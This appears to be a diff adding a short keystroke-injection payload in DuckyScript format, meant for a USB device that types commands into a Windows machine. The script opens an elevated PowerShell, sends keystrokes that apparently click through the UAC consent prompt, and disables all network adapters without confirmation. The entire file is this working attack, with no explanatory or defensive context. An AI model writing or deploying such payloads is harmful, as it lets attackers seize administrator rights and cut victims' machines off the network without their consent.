@@ -1,0 +1,16 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 800
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 800
+ENTER
+DELAY 800
+STRING Get-NetAdapter | ForEach-Object { Disable-NetAdapter -Name $_.Name -Confirm:$false }
+ENTER
+DELAY 1000
+STRING exit
+ENTER
